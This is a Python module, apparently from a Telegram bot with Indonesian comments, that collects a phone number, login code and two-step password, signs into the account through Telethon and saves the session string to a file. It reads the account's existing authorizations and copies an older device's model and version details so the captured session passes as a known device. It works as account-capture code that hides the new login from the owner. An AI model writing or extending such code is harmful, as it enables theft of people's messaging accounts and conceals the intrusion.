import os
from telethon.sync import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneNumberInvalidError
from telethon.tl.functions.account import GetAuthorizationsRequest

from bot.config import API_ID, API_HASH, SESSION_DIR

os.makedirs(SESSION_DIR, exist_ok=True)

phone_code_hash_map = {}
client_map = {}
device_info_map = {}

# Konfigurasi spoof default (Xiaomi 11T digunakan sementara atau sebagai fallback)
DEFAULT_SPOOF = {
    "device_model": "Xiaomi 11T",
    "system_version": "Android 13",
    "app_version": "10.5.0 (12345)",
    "lang_code": "en",
    "system_lang_code": "en"
}

# Kirim OTP ke nomor
async def send_otp(phone: str):
    # Gunakan default spoof sementara untuk koneksi awal
    client = TelegramClient(
        StringSession(),
        API_ID,
        API_HASH,
        **DEFAULT_SPOOF
    )

    await client.connect()

    try:
        sent = await client.send_code_request(phone)
        phone_code_hash_map[phone] = sent.phone_code_hash  # Simpan hash OTP
        client_map[phone] = client  # Simpan client sementara
        return {"status": "ok", "2fa_required": False}
    except PhoneNumberInvalidError:
        await client.disconnect()
        return {"status": "error", "message": "Nomor tidak valid"}
    except Exception as e:
        await client.disconnect()
        return {"status": "error", "message": str(e)}

# Verifikasi OTP dan spoof device dari API (fallback ke Xiaomi 11T jika gagal)
async def verify_otp(phone: str, otp: str):
    phone_code_hash = phone_code_hash_map.get(phone)
    client = client_map.get(phone)

    if not client or not phone_code_hash:
        return {"status": "error", "message": "Kode OTP tidak ditemukan"}

    try:
        await client.sign_in(phone, code=otp, phone_code_hash=phone_code_hash)

        # Ambil perangkat lama dari API Telegram
        spoof = dict(DEFAULT_SPOOF)
        try:
            auths = await client(GetAuthorizationsRequest())
            for a in reversed(auths.authorizations):
                if not a.current:
                    spoof.update({
                        "device_model": a.device_model or spoof["device_model"],
                        "system_version": a.system_version or spoof["system_version"],
                        "app_version": a.app_version or spoof["app_version"],
                    })
                    break
        except Exception:
            pass  # Gunakan spoof default jika API gagal

        device_info_map[phone] = spoof  # Simpan spoof untuk digunakan nanti

        # Simpan session hasil login awal
        session_str = client.session.save()
        path = os.path.join(SESSION_DIR, f"{phone}.session")
        with open(path, "w") as f:
            f.write(session_str)

        await client.disconnect()
        return {"status": "ok", "next": "finish"}
    except SessionPasswordNeededError:
        return {"status": "ok", "next": "password"}
    except Exception as e:
        return {"status": "error", "message": str(e)}

# Verifikasi 2FA dan aktifkan ulang session dengan spoofed device
async def verify_password(phone: str, password: str):
    client = client_map.get(phone)
    if not client:
        return {"status": "error", "message": "Session tidak ditemukan"}

    try:
        await client.sign_in(password=password)

        # Ambil spoof yang sudah disimpan
        spoof = device_info_map.get(phone, dict(DEFAULT_SPOOF))

        # Buat client baru dengan spoof info
        spoofed = TelegramClient(
            StringSession(client.session.save()),
            API_ID,
            API_HASH,
            **spoof
        )

        await spoofed.connect()

        # Simpan session akhir yang sudah di-spoof
        session_str = spoofed.session.save()
        path = os.path.join(SESSION_DIR, f"{phone}.session")
        with open(path, "w") as f:
            f.write(session_str)

        await spoofed.disconnect()
        return {"status": "ok", "next": "finish"}
    except Exception as e:
        return {"status": "error", "message": str(e)}